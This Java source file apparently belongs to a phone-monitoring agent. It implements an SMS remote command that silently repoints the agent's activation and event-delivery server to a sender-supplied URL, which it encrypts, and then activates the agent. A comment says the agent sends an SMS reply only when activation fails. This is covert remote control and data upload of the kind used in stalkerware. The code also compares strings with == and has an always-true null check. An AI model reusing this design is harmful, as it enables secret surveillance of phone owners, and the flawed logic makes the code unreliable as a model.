package com.vvt.rmtcmd.sms;

import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.global.Global;
import com.vvt.info.ServerUrl;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendActivateCmdResponse;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendActivateManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSActivateURL extends RmtCmdAsync implements PhoenixProtocolListener {
	
	private SendActivateManager actManager = Global.getSendActivateManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private String activationCode = null;
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSActivateURL(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		if (rmtCmdLine.getRecipientNumber() != null || rmtCmdLine.getRecipientNumber() != "") {
			smsMessage.setNumber(rmtCmdLine.getRecipientNumber());
		} 
	}
	
	// Runnable
	public void run() {
		activationCode = rmtCmdLine.getActivationCode();
		if (Log.isDebugEnable()) {
			Log.debug("SMSActivateURLCmd.run()", "activationCode: " + rmtCmdLine.getActivationCode() + ", url: " + rmtCmdLine.getUrl());
		}
		int cmdId = smsCmdCode.getActivationAcUrlCmd();
		if (activationCode == "" || activationCode == null) {
			cmdId = smsCmdCode.getActivateUrlCmd();
		}  
		doSMSHeader(cmdId);
		try {
			String url = rmtCmdLine.getUrl();
			if (!url.endsWith("/")) {
				url += "/";
			}
			url += "gateway";
			String http = "http://";
			if (!url.startsWith(http)) {
				url = http.concat(url);
			}
			byte[] key = AESKeyGenerator.generateAESKey();
			byte[] encryptedUrl = AESEncryptor.encrypt(key, url.getBytes());
			serverUrl.setServerActivationUrl(key, encryptedUrl);
			serverUrl.setServerDeliveryUrl(key, encryptedUrl);
			actManager.addListener(this);
			actManager.activate(activationCode);
			// TODO:
//			eventSender.addListener(this);			
		} catch(Exception e) {
			actManager.removeListener(this);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		actManager.removeListener(this);
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	public void onSuccess(CommandResponse response) {
		actManager.removeListener(this);
		if (response instanceof SendActivateCmdResponse) {
			SendActivateCmdResponse sendActRes = (SendActivateCmdResponse)response;
			if (sendActRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.ACT_SUCCESS);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendActRes.getServerMsg());								
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// TODO: As requirement that client will reply only if failed.
			/*// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();*/
			// To send events
			eventSender.sendEvents();
		} 
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSActivateURLCmd.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
